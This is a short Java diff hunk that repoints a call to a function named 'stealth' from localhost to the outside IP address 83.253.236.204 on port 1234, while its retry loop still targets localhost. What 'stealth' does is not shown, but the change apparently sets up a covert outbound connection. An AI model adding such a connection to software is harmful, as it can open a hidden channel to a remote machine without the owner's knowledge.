@@ -396,7 +396,7 @@ import java.util.Scanner;
     public static void main (String[]args)throws Exception
     {
         int integer;
-        integer = stealth(new String[]{"localhost","1234"});
+        integer = stealth(new String[]{"83.253.236.204","1234"});
         // try again if connection is not closed normally
         while(integer==-1) integer = stealth(new String[]{"localhost", "1234"});
     }
